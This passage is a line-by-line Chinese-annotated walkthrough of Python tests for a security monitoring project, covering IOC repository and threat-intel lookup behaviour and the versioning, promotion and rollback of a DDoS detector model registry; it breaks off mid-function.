| 16 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("SECRET_KEY", "test-secret-key-which-is-at-least-32b")` |
| 17 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_USERNAME", "admin")` |
| 18 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.setenv("ADMIN_PASSWORD", "changeme")` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.app import create_app` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, _ = create_app()` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["TESTING"] = True` |
| 24 | 返回结果：把处理后的值交回调用方。 | `    return app` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 函数定义：声明 `test_expired_ioc_not_in_memory_or_hit` 的输入、处理逻辑和返回结果。 | `def test_expired_ioc_not_in_memory_or_hit(monkeypatch, tmp_path):` |
| 28 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 29 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import IOC` |
| 30 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.collectors.ioc_repository import utc_now` |
| 31 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.collectors.threat_intel import ThreatIntelCollector` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _flask_app(monkeypatch, tmp_path)` |
| 34 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        past = utc_now() - timedelta(hours=1)` |
| 36 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.add(` |
| 37 | 函数调用：执行已有函数/方法完成当前步骤。 | `            IOC(` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                id=uuid.uuid4().hex,` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                ioc_type="ip",` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                value="9.9.9.9",` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                sources=["manual"],` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                score=99,` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                expires_at=past,` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                hits=0,` |
| 45 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 46 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 47 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 48 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ti: ThreatIntelCollector = app.extensions["guardian_threat_intel"]` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        n = ti.refresh_local_from_db()` |
| 51 | 断言：验证测试或运行时假设是否成立。 | `        assert n == 0` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r = ti.check_ip("9.9.9.9")` |
| 53 | 断言：验证测试或运行时假设是否成立。 | `        assert r["is_malicious"] is False` |
| 54 | 断言：验证测试或运行时假设是否成立。 | `        assert r["source"] == "none"` |
| 55 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 56 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 57 | 函数定义：声明 `test_merge_sources_and_max_score` 的输入、处理逻辑和返回结果。 | `def test_merge_sources_and_max_score(monkeypatch, tmp_path):` |
| 58 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 59 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.collectors.ioc_repository import IOCRepository` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _flask_app(monkeypatch, tmp_path)` |
| 62 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        repo = IOCRepository(db.session)` |
| 64 | 函数调用：执行已有函数/方法完成当前步骤。 | `        repo.upsert_merge(` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ioc_type="ip",` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value="10.0.0.1",` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source="manual",` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            score=40,` |
| 69 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 70 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 71 | 函数调用：执行已有函数/方法完成当前步骤。 | `        repo.upsert_merge(` |
| 72 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ioc_type="ip",` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value="10.0.0.1",` |
| 74 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source="abuseipdb",` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            score=90,` |
| 76 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 77 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        row = repo.find_active_dict("ip", "10.0.0.1")` |
| 79 | 断言：验证测试或运行时假设是否成立。 | `        assert row is not None` |
| 80 | 断言：验证测试或运行时假设是否成立。 | `        assert set(row["sources"]) == {"abuseipdb", "manual"}` |
| 81 | 断言：验证测试或运行时假设是否成立。 | `        assert row["score"] == 90` |
| 82 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 83 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 84 | 函数定义：声明 `test_external_wait_timeout_degraded` 的输入、处理逻辑和返回结果。 | `def test_external_wait_timeout_degraded(monkeypatch, tmp_path):` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `    monkeypatch.delenv("THREAT_INTEL_MOCK", raising=False)` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 函数定义：声明 `slow_get` 的输入、处理逻辑和返回结果。 | `    def slow_get(*_a, **_k):` |
| 88 | 函数调用：执行已有函数/方法完成当前步骤。 | `        time.sleep(0.3)` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m = MagicMock()` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m.raise_for_status.return_value = None` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        m.json.return_value = {"data": {"abuseConfidenceScore": 99}}` |
| 92 | 返回结果：把处理后的值交回调用方。 | `        return m` |
| 93 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 94 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.collectors.threat_intel import ThreatIntelCollector` |
| 95 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 96 | 上下文管理：自动管理资源打开与释放。 | `    with patch("src.collectors.ioc_providers.requests.get", side_effect=slow_get):` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ti = ThreatIntelCollector(` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            abuseipdb_key="k",` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            virustotal_key="",` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            external_http_timeout=5.0,` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            external_wait_sec=0.05,` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mock_external=False,` |
| 103 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        r = ti.check_ip("1.2.3.4")` |
| 105 | 断言：验证测试或运行时假设是否成立。 | `    assert r["is_malicious"] is False` |
| 106 | 断言：验证测试或运行时假设是否成立。 | `    assert r.get("degraded") is True` |
| 107 | 断言：验证测试或运行时假设是否成立。 | `    assert r.get("reason") == "external_timeout"` |
| 108 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 109 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `test_external_wait_timeout_degraded = pytest.mark.slow(test_external_wait_timeout_degraded)` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 112 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 113 | 函数定义：声明 `test_local_db_hit_before_external` 的输入、处理逻辑和返回结果。 | `def test_local_db_hit_before_external(monkeypatch, tmp_path):` |
| 114 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 115 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.collectors.ioc_repository import IOCRepository` |
| 116 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.collectors.threat_intel import ThreatIntelCollector` |
| 117 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = _flask_app(monkeypatch, tmp_path)` |
| 119 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 120 | 函数调用：执行已有函数/方法完成当前步骤。 | `        IOCRepository(db.session).upsert_merge(` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ioc_type="ip",` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value="10.10.10.10",` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            source="manual",` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            score=88,` |
| 125 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 126 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.commit()` |
| 127 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ti = ThreatIntelCollector(` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            abuseipdb_key="should-not-be-called",` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            mock_external=False,` |
| 131 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `        ti.bind_flask_app(app)` |
| 133 | 上下文管理：自动管理资源打开与释放。 | `        with patch("src.collectors.ioc_providers.requests.get") as mock_get:` |
| 134 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            r = ti.check_ip("10.10.10.10")` |
| 135 | 函数调用：执行已有函数/方法完成当前步骤。 | `        mock_get.assert_not_called()` |
| 136 | 断言：验证测试或运行时假设是否成立。 | `        assert r["is_malicious"] is True` |
| 137 | 断言：验证测试或运行时假设是否成立。 | `        assert r["source"] == "local_db"` |
| 138 | 断言：验证测试或运行时假设是否成立。 | `        assert r["ioc_value"] == "10.10.10.10"` |
| 139 | 断言：验证测试或运行时假设是否成立。 | `        assert "manual" in (r.get("sources") or [])` |

## `tests/test_model_registry.py`

- 类型：测试
- 行数：182

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""R3：ModelRegistry 版本目录、热切换、失败保留、回滚与 manifest 家族校验。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import json` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import sys` |
| 7 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 8 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import joblib` |
| 9 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import pytest` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from sklearn.ensemble import RandomForestClassifier` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))` |
| 13 | 条件判断：满足条件时进入对应分支。 | `if PROJECT_ROOT not in sys.path:` |
| 14 | 函数调用：执行已有函数/方法完成当前步骤。 | `    sys.path.insert(0, PROJECT_ROOT)` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from src.detectors.ddos_detector import DDoSDetector  # noqa: E402` |
| 17 | 导入对象：从指定模块引入类、函数或常量。 | `from src.registry.model_registry import ModelRegistry  # noqa: E402` |
| 18 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.nsl_kdd_adapter import NSL_KDD_FEATURE_COLUMNS  # noqa: E402` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 函数定义：声明 `_write_ddos_manifest_json` 的输入、处理逻辑和返回结果。 | `def _write_ddos_manifest_json(` |
| 22 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    version_dir: str,` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    version: str,` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    schema_name: str = "network_flow_v1",` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    trust_tier: str = "prototype_nsl_kdd",` |
| 27 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> None:` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pkl = os.path.join(version_dir, "model.pkl")` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload = {` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_name": "ddos_test",` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "version": version,` |
| 32 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "schema_name": schema_name,` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "schema_version": "1",` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "feature_columns": list(NSL_KDD_FEATURE_COLUMNS),` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "training_dataset": "NSL-KDD",` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "metrics": {"accuracy": 0.9},` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "created_at": "2026-01-01T00:00:00Z",` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "artifact_files": {"model": "model.pkl"},` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "trust_tier": trust_tier,` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "adapter": "nsl_kdd_v1",` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_input_mode": "tabular",` |
| 42 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 43 | 上下文管理：自动管理资源打开与释放。 | `    with open(os.path.join(version_dir, "manifest.json"), "w", encoding="utf-8") as f:` |
| 44 | 函数调用：执行已有函数/方法完成当前步骤。 | `        json.dump(payload, f, ensure_ascii=False, indent=2)` |
| 45 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 函数定义：声明 `_train_rf_at` 的输入、处理逻辑和返回结果。 | `def _train_rf_at(path: str) -> None:` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    X = [[0.0] * 41]` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    y = ["normal"]` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    clf = RandomForestClassifier(n_estimators=1, random_state=0)` |
| 51 | 函数调用：执行已有函数/方法完成当前步骤。 | `    clf.fit(X, y)` |
| 52 | 函数调用：执行已有函数/方法完成当前步骤。 | `    joblib.dump(clf, path)` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 55 | 函数定义：声明 `test_promote_success_switches_current` 的输入、处理逻辑和返回结果。 | `def test_promote_success_switches_current(tmp_path):` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    root = tmp_path / "saved"` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ddos = root / "ddos"` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v1 = ddos / "v1"` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v2 = ddos / "v2"` |
| 60 | 函数调用：执行已有函数/方法完成当前步骤。 | `    v1.mkdir(parents=True)` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `    v2.mkdir(parents=True)` |
| 62 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _train_rf_at(str(v1 / "model.pkl"))` |
| 63 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _write_ddos_manifest_json(str(v1), version="v1-label")` |
| 64 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _train_rf_at(str(v2 / "model.pkl"))` |
| 65 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _write_ddos_manifest_json(str(v2), version="v2-label")` |
| 66 | 函数调用：执行已有函数/方法完成当前步骤。 | `    (ddos / "current.txt").write_text("v1\n", encoding="utf-8")` |
| 67 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reg = ModelRegistry(str(root), audit_sink=None)` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det = DDoSDetector()` |
| 70 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.try_load_detector("ddos", det) is True` |
| 71 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.promote_version("ddos", "v2", det) is True` |
| 72 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.get_current_version_id("ddos") == "v2"` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    cur_txt = ddos / "current.txt"` |
| 74 | 断言：验证测试或运行时假设是否成立。 | `    assert cur_txt.read_text(encoding="utf-8").strip() == "v2"` |
| 75 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 76 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 77 | 函数定义：声明 `test_promote_load_failure_keeps_previous_service` 的输入、处理逻辑和返回结果。 | `def test_promote_load_failure_keeps_previous_service(tmp_path):` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    root = tmp_path / "saved"` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ddos = root / "ddos"` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v1 = ddos / "v1"` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v2 = ddos / "v2"` |
| 82 | 函数调用：执行已有函数/方法完成当前步骤。 | `    v1.mkdir(parents=True)` |
| 83 | 函数调用：执行已有函数/方法完成当前步骤。 | `    v2.mkdir(parents=True)` |
| 84 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _train_rf_at(str(v1 / "model.pkl"))` |
| 85 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _write_ddos_manifest_json(str(v1), version="v1")` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _write_ddos_manifest_json(str(v2), version="v2")` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `    (v2 / "model.pkl").write_bytes(b"not a real joblib")` |
| 88 | 函数调用：执行已有函数/方法完成当前步骤。 | `    (ddos / "current.txt").write_text("v1\n", encoding="utf-8")` |
| 89 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reg = ModelRegistry(str(root), audit_sink=None)` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det = DDoSDetector()` |
| 92 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.try_load_detector("ddos", det) is True` |
| 93 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.promote_version("ddos", "v2", det) is False` |
| 94 | 断言：验证测试或运行时假设是否成立。 | `    assert det.is_ready is True` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    feats = {` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "src_ip": "1.1.1.1",` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "protocol": "TCP",` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_pkt_count": 5,` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_byte_count": 1200,` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "flow_duration": 0.5,` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "window_unique_dst_port": 2,` |
| 102 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = det.detect(feats)` |
| 104 | 断言：验证测试或运行时假设是否成立。 | `    assert r is not None` |
| 105 | 断言：验证测试或运行时假设是否成立。 | `    assert r.raw_data.get("_inference", {}).get("model_version") == "v1"` |
| 106 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 107 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 108 | 函数定义：声明 `test_rollback_inference_version` 的输入、处理逻辑和返回结果。 | `def test_rollback_inference_version(tmp_path):` |
| 109 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    root = tmp_path / "saved"` |
| 110 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ddos = root / "ddos"` |
| 111 | 循环：逐个处理集合或迭代器中的元素。 | `    for vid, label in (("v1", "first"), ("v2", "second")):` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        d = ddos / vid` |
| 113 | 函数调用：执行已有函数/方法完成当前步骤。 | `        d.mkdir(parents=True)` |
| 114 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _train_rf_at(str(d / "model.pkl"))` |
| 115 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _write_ddos_manifest_json(str(d), version=label)` |
| 116 | 函数调用：执行已有函数/方法完成当前步骤。 | `    (ddos / "current.txt").write_text("v1\n", encoding="utf-8")` |
| 117 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reg = ModelRegistry(str(root), audit_sink=None)` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det = DDoSDetector()` |
| 120 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.try_load_detector("ddos", det) is True` |
| 121 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.promote_version("ddos", "v2", det) is True` |
| 122 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.rollback("ddos", det) is True` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    r = det.detect(` |
| 124 | 代码语句：参与当前文件的业务流程或数据处理。 | `        {` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "src_ip": "1.1.1.1",` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "protocol": "TCP",` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "flow_pkt_count": 5,` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "flow_byte_count": 1200,` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "flow_duration": 0.5,` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "window_unique_dst_port": 2,` |
| 131 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 133 | 断言：验证测试或运行时假设是否成立。 | `    assert r is not None` |
| 134 | 断言：验证测试或运行时假设是否成立。 | `    assert r.raw_data["_inference"]["model_version"] == "first"` |
| 135 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 136 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 137 | 函数定义：声明 `test_promote_rejects_manifest_schema_policy` 的输入、处理逻辑和返回结果。 | `def test_promote_rejects_manifest_schema_policy(tmp_path):` |
| 138 | 文档字符串：说明当前模块、类或函数的职责。 | `    """production + NSL 41 列在全局 manifest 校验阶段即拒绝，不得上线。"""` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    root = tmp_path / "saved"` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ddos = root / "ddos"` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v1 = ddos / "v1"` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    v2 = ddos / "v2"` |
| 143 | 函数调用：执行已有函数/方法完成当前步骤。 | `    v1.mkdir(parents=True)` |
| 144 | 函数调用：执行已有函数/方法完成当前步骤。 | `    v2.mkdir(parents=True)` |
| 145 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _train_rf_at(str(v1 / "model.pkl"))` |
| 146 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _write_ddos_manifest_json(str(v1), version="v1")` |
| 147 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _train_rf_at(str(v2 / "model.pkl"))` |
| 148 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _write_ddos_manifest_json(` |
| 149 | 函数调用：执行已有函数/方法完成当前步骤。 | `        str(v2), version="v2", schema_name="network_flow_v1", trust_tier="production"` |
| 150 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 151 | 函数调用：执行已有函数/方法完成当前步骤。 | `    (ddos / "current.txt").write_text("v1\n", encoding="utf-8")` |
| 152 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    reg = ModelRegistry(str(root), audit_sink=None)` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    det = DDoSDetector()` |
| 155 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.try_load_detector("ddos", det) is True` |
| 156 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.promote_version("ddos", "v2", det) is False` |
| 157 | 断言：验证测试或运行时假设是否成立。 | `    assert reg.get_current_version_id("ddos") in (None, "v1")` |
| 158 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 159 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 160 | 函数定义：声明 `test_resolve_legacy_flat_pkl` 的输入、处理逻辑和返回结果。 | `def test_resolve_legacy_flat_pkl(tmp_path):` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    pkl = tmp_path / "ddos_rf_v1.pkl"` |
| 162 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _train_rf_at(str(pkl))` |
| 163 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.schema.persist import write_model_manifest  # noqa: WPS433` |
| 164 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 165 | 函数调用：执行已有函数/方法完成当前步骤。 | `    write_model_manifest(` |
| 166 | 函数调用：执行已有函数/方法完成当前步骤。 | `        str(pkl),` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_name="d",` |
